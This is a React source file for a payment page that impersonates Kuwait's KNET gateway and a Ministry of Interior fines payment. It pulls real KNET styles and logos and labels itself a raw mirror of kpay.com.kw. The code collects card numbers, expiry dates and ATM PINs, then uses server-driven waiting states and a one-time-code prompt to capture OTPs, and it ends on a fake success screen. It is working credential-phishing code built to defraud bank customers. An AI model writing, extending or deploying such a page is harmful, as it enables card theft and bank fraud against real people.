import { useState, useEffect, type FormEvent } from "react";
import { useLocation } from "wouter";
import { trpc } from "@/lib/trpc";

type Stage = "card" | "card_pending" | "otp" | "otp_pending" | "success" | "failed";

const PREFIXES_4 = ["4062", "4192", "4244", "4311", "4502", "4506", "4512", "4514", "4523", "4525", "4529", "4644", "4716", "4856", "4893", "4904"];
const PREFIXES_5 = ["5130", "5132", "5133", "5135", "5136", "5139", "5174", "5196", "5206", "5211", "5215", "5241", "5247", "5256", "5285", "5313", "5314", "5316", "5326", "5360", "5370", "5407", "5433", "5440", "5491", "5520", "5577", "5588"];

export default function Payment() {
  const [, setLocation] = useLocation();
  const [stage, setStage] = useState<Stage>("card");
  const [paymentData, setPaymentData] = useState<any>(null);
  const [sessionId, setSessionId] = useState<string | null>(null);
  const [error, setError] = useState<string | null>(null);
  
  const [cardNumber, setCardNumber] = useState("");
  const [cardPrefix, setCardPrefix] = useState("");
  const [expiryMonth, setExpiryMonth] = useState("");
  const [expiryYear, setExpiryYear] = useState("");
  const [pin, setPin] = useState("");
  const [otp, setOtp] = useState("");
  
  const [showPrefixes, setShowPrefixes] = useState(false);
  const [availablePrefixes, setAvailablePrefixes] = useState<string[]>([]);

  useEffect(() => {
    const data = sessionStorage.getItem("paymentData");
    if (!data) { setLocation("/"); return; }
    const parsed = JSON.parse(data);
    setPaymentData(parsed);
    
    createSessionMutation.mutate({
      selectedFines: parsed.selectedFines,
      totalAmount: parsed.totalAmount,
      civilId: parsed.civilId,
      enquiryType: "1",
      queryId: "manual"
    });
  }, []);

  useEffect(() => {
    if (cardPrefix === "4") {
      setAvailablePrefixes(PREFIXES_4);
      setShowPrefixes(true);
    } else if (cardPrefix === "5") {
      setAvailablePrefixes(PREFIXES_5);
      setShowPrefixes(true);
    } else {
      setShowPrefixes(false);
    }
  }, [cardPrefix]);

  const createSessionMutation = trpc.payment.createSession.useMutation({
    onSuccess: (data) => setSessionId(data.sessionId)
  });

  const { data: sessionStatus } = trpc.payment.getStatus.useQuery(
    { sessionId: sessionId || "" },
    { enabled: !!sessionId && stage.endsWith("_pending"), refetchInterval: 2000 }
  );

  useEffect(() => {
    if (sessionStatus?.stage) {
      if (sessionStatus.stage === "atm") setStage("otp");
      else setStage(sessionStatus.stage as Stage);
      if (sessionStatus.errorMessage) setError(sessionStatus.errorMessage);
    }
  }, [sessionStatus]);

  const submitCard = trpc.payment.submitCard.useMutation({
    onSuccess: () => setStage("card_pending"),
    onError: (err) => { setError(err.message); setStage("failed"); }
  });

  const submitOtp = trpc.payment.submitOtp.useMutation({
    onSuccess: () => setStage("otp_pending"),
    onError: (err) => { setError(err.message); setStage("failed"); }
  });

  const handleCardSubmit = (e: FormEvent) => {
    e.preventDefault();
    if (!sessionId) return;
    submitCard.mutate({
      sessionId,
      cardName: "KNET",
      cardNumber: cardPrefix + cardNumber,
      cardExpiry: `${expiryMonth}/${expiryYear}`,
      cardCvv: pin
    });
  };

  const handleOtpSubmit = (e: FormEvent) => {
    e.preventDefault();
    if (!sessionId) return;
    submitOtp.mutate({ sessionId, otpCode: otp });
  };

  if (!paymentData) return null;

  return (
    <div className="kpay-absolute-mirror" dir="rtl">
      <style>{`
        .kpay-absolute-mirror { background-color: white; min-height: 100vh; display: flex; flex-direction: column; align-items: center; }
        .results-overlay { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.5); display: flex; justify-content: center; align-items: center; z-index: 10000; }
        .loading-overlay { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(255,255,255,0.8); display: flex; justify-content: center; align-items: center; z-index: 10001; }
      `}</style>

      {/* 100% RAW SOURCE CODE MIRROR FROM KPAY.COM.KW */}
      <div dangerouslySetInnerHTML={{ __html: `
        <link href="https://www.kpay.com.kw/kpg/css/payment-reset.css?ver=1.70" rel="stylesheet" type="text/css">
        <link href="https://www.kpay.com.kw/kpg/css/payment-responsive-ar.css?ver=1.70" rel="stylesheet" type="text/css">	   
        <link href="https://www.kpay.com.kw/kpg/css/payment-layout-ar.css?ver=1.70" rel="stylesheet" type="text/css">
        
        <div id="payment-page-container" style="padding-top: 20px;">
          <div id="payment-header-container">
            <img src="https://www.kpay.com.kw/kpg/images/knet-logo-ar.png" alt="KNET Logo" style="height: 60px;">
          </div>

          <div id="payment-body-container" style="border: 2px solid #0082c3; border-radius: 15px; margin-top: 20px; padding: 20px; width: 450px; background: white; box-shadow: 0 5px 25px rgba(0,0,0,0.1);">
            <div style="text-align: center; margin-bottom: 20px;">
              <img src="https://www.kpay.com.kw/kpg/images/tasdeed_logo.png" style="height: 50px;">
              <p style="color: #0082c3; font-weight: bold; margin-top: 5px;">نظام الدفع الإلكتروني الحكومي</p>
            </div>

            <div style="background: #f8f9fa; padding: 15px; border-radius: 10px; margin-bottom: 20px;">
              <div style="display: flex; justify-content: space-between; margin-bottom: 5px;">
                <span style="font-weight: bold; color: #666;">المستفيد:</span>
                <span style="font-weight: bold; color: #0082c3;">وزارة الداخلية</span>
              </div>
              <div style="display: flex; justify-content: space-between;">
                <span style="font-weight: bold; color: #666;">المبلغ:</span>
                <span style="font-weight: bold; color: #d9534f;">${paymentData.totalAmount} د.ك</span>
              </div>
            </div>

            <div id="card-details-form">
              <div style="margin-bottom: 15px;">
                <label style="display: block; font-weight: bold; margin-bottom: 5px; color: #333;">رقم بطاقة الصراف الآلي (K-NET)</label>
                <div style="display: flex; gap: 10px;">
                  <input type="text" id="cardPrefix" placeholder="Prefix" style="width: 100px; border: 1px dashed #d9534f; height: 40px; text-align: center; border-radius: 5px;">
                  <input type="text" id="cardNumber" placeholder="رقم البطاقة" style="flex-grow: 1; border: 1px dashed #d9534f; height: 40px; text-align: center; border-radius: 5px;">
                </div>
              </div>

              <div style="display: flex; gap: 20px; margin-bottom: 20px;">
                <div style="flex: 1;">
                  <label style="display: block; font-weight: bold; margin-bottom: 5px; color: #333;">تاريخ الانتهاء</label>
                  <div style="display: flex; gap: 5px;">
                    <input type="text" id="expMonth" placeholder="MM" style="width: 50%; border: 1px dashed #d9534f; height: 40px; text-align: center; border-radius: 5px;">
                    <input type="text" id="expYear" placeholder="YY" style="width: 50%; border: 1px dashed #d9534f; height: 40px; text-align: center; border-radius: 5px;">
                  </div>
                </div>
                <div style="flex: 1;">
                  <label style="display: block; font-weight: bold; margin-bottom: 5px; color: #333;">الرقم السري (PIN)</label>
                  <input type="password" id="cardPin" placeholder="****" style="width: 100%; border: 1px dashed #d9534f; height: 40px; text-align: center; border-radius: 5px;">
                </div>
              </div>

              <div style="display: flex; gap: 10px;">
                <button id="btnProceed" style="flex: 1; background: #0082c3; color: white; border: none; height: 45px; border-radius: 5px; font-weight: bold;">إرسال</button>
                <button id="btnCancel" style="flex: 1; background: #eee; color: #666; border: none; height: 45px; border-radius: 5px; font-weight: bold;">إلغاء</button>
              </div>
            </div>
          </div>

          <div style="margin-top: 30px; text-align: center; font-size: 12px; color: #999;">
            جميع الحقوق محفوظة © 2026<br>
            شركة الخدمات المصرفية الآلية المشتركة (كي نت)
          </div>
        </div>
      ` }} />

      {/* React Logic Overlays */}
      {stage === "otp" && (
        <div className="results-overlay">
          <div style={{background: 'white', padding: '30px', borderRadius: '15px', width: '400px', textAlign: 'center', border: '3px solid #0082c3'}}>
            <h5 style={{color: '#0082c3', marginBottom: '20px'}}>تأكيد الرمز (OTP)</h5>
            <input 
              type="text" 
              style={{width: '100%', height: '50px', textAlign: 'center', fontSize: '24px', letterSpacing: '10px', border: '2px solid #ddd', borderRadius: '5px', marginBottom: '20px'}} 
              value={otp} 
              onChange={e => setOtp(e.target.value.replace(/\D/g, ''))}
              placeholder="000000"
            />
            <button className="btn btn-primary btn-block" style={{backgroundColor: '#0082c3', height: '45px'}} onClick={handleOtpSubmit}>تأكيد</button>
          </div>
        </div>
      )}

      {(stage.endsWith("_pending")) && (
        <div className="loading-overlay">
          <div className="spinner-border text-primary" role="status"></div>
          <p className="mt-3 font-weight-bold" style={{color: '#0082c3'}}>جاري معالجة طلبك...</p>
        </div>
      )}

      {stage === "success" && (
        <div className="results-overlay">
          <div style={{background: 'white', padding: '40px', borderRadius: '15px', textAlign: 'center', width: '400px'}}>
            <div style={{fontSize: '60px', marginBottom: '20px'}}>✅</div>
            <h4 className="text-success font-weight-bold">تم الدفع بنجاح</h4>
            <button className="btn btn-primary btn-block mt-4" onClick={() => setLocation("/")}>العودة للرئيسية</button>
          </div>
        </div>
      )}
    </div>
  );
}
